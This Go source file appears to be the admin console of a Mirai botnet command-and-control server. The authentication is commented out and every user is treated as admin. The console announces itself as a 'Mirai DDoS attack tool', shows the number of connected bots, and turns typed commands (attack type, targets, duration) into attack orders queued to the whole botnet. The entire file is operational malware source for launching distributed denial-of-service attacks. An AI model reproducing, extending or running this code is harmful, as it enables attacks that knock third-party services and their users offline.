package main

import (
    "fmt"
    "net"
    "time"
//    "strings"
//    "io/ioutil"
//    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    fmt.Println("[admin]start")
    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()
/*
    headerb, err := ioutil.ReadFile("prompt.txt")
    if err != nil {
        fmt.Println("[admin]retun :31",err)
        return
    }*/
    fmt.Println("[admin]start")
    //header := string(headerb)
    //this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
/*
    // Get username
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[34;1mпользователь\033[33;3m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[34;1mпароль\033[33;3m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
*/
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    //this.conn.Write([]byte("\r\n"))
//    spinBuf := []byte{'-', '\\', '|', '/'}
/*    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[37;1mпроверив счета... \033[31m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
	time.Sleep(time.Duration(30) * time.Millisecond)
    }
*/
//    var loggedIn bool
    var userInfo AccountInfo
        //fmt.Println("[admin]database connect")
/*    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\r\033[32;1mпроизошла неизвестная ошибка\r\n"))
        this.conn.Write([]byte("\033[31mнажмите любую клавишу для выхода. (any key)\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
*/
    userInfo.admin = 1
/*    this.conn.Write([]byte("\r\n\033[0m"))
    this.conn.Write([]byte("[+] DDOS | Succesfully hijacked connection\r\n"))
    time.Sleep(25 * time.Millisecond)
    this.conn.Write([]byte("[+] DDOS | Masking connection from utmp+wtmp...\r\n"))
    time.Sleep(50 * time.Millisecond)
    this.conn.Write([]byte("[+] DDOS | Hiding from netstat...\r\n"))
    time.Sleep(15 * time.Millisecond)
    this.conn.Write([]byte("[+] DDOS | Removing all traces of LD_PRELOAD...\r\n"))
    for i := 0; i < 4; i++ {
        time.Sleep(10 * time.Millisecond)
        this.conn.Write([]byte(fmt.Sprintf("[+] DDOS | Wiping env libc.poison.so.%d\r\n", i + 1)))
    }
    this.conn.Write([]byte("[+] DDOS | Setting up virtual terminal...\r\n"))
    time.Sleep(1 * time.Second)
*/
    time.Sleep(25 * time.Millisecond)
    this.conn.Write([]byte("[+] This is Mirai DDoS attack tool.\r\n"))
    time.Sleep(25 * time.Millisecond)
    this.conn.Write([]byte("[+] Command is here.\r\n"))
    time.Sleep(25 * time.Millisecond)
    this.conn.Write([]byte("[+] attack:[type target(s) time flags]\r\n"))
    time.Sleep(25 * time.Millisecond)
    this.conn.Write([]byte("[+] (If you use ? in attack command, you can check help.\r\n     Ex:[?],[udp ?],[udp 1.1.1.1 ?])\r\n"))
    time.Sleep(25 * time.Millisecond)
    this.conn.Write([]byte("[+] exit:[exit],[quit]\r\n"))
    time.Sleep(25 * time.Millisecond)
    this.conn.Write([]byte("[+] botcount:[botcount]\r\n"))



    go func() {
        i := 0
        for {
            var BotCount int
            /*if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {*/
                BotCount = clientList.Count()
            //}

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d Bots Connected | root\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()

    //this.conn.Write([]byte("\033[37;1m[!] Sharing access IS prohibited!\r\n[!] Do NOT share your credentials!\r\n\033[36;1mReady\r\n"))
    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[32;1m" + "root" + "@botnet# \033[0m"))
        cmd, err := this.ReadLine(false)
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        botCount = -1//userInfo.maxBots

/*
        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("Enter new username: "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter new password: "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("Enter wanted bot count (-1 for full net): "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("Max attack duration (-1 for none): "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("Cooldown time (0 for none): "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("New account info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBots: " + max_bots_str + "\r\nContinue? (y/N)"))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
*/


        if userInfo.admin == 1 && cmd == "botcount" {
            m := clientList.Distribution()
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t%d\033[0m\r\n", k, v)))
            }
            continue
        }
/*        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
	    fmt.Println("[admin]retun :209")
            botCatagory = cataSplit[0][1:]
	    fmt.Println("[admin]retun :211")
            cmd = cataSplit[1]
        }
*/
        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack("root", atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                } else {
                    fmt.Println("Blocked attack by " + "root" + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\x1B' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}